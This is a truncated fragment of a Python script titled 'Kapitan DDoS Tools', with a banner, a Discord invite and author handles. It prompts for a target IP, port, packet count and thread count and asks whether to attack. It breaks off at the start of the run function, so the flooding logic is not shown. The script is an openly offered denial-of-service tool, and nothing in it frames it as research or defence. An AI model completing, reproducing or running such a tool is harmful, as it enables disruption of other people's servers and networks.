...
print("\033[92m░░░██║░░░╚█████╔╝╚█████╔╝███████╗")
print("\033[92m░░░╚═╝░░░░╚════╝░░╚════╝░╚══════╝")
print("\033[92m========= Kapitan DDoS Tools =========") 
print("\033[92m>>> Author : Kapitan")
print("\033[92m>>> Discord Link : https://discord.gg/PM7kwRjJ") 
print("\033[92m>>> Coded : TFC [BOT]#7792/TFC [BOT]#7792") 
print("\033[92m>>> Basta Pogi Ni TFC [BOT]#7792 <3")
ip = str(input("IP TARGET:"))
port = int(input("PORT TARGET:"))
choice = str(input("Do you want to attack?(y/n):"))
times = int(input("PACKET(1000):"))
threads = int(input("THREADS(5000):"))
os.system("clear")
def run():
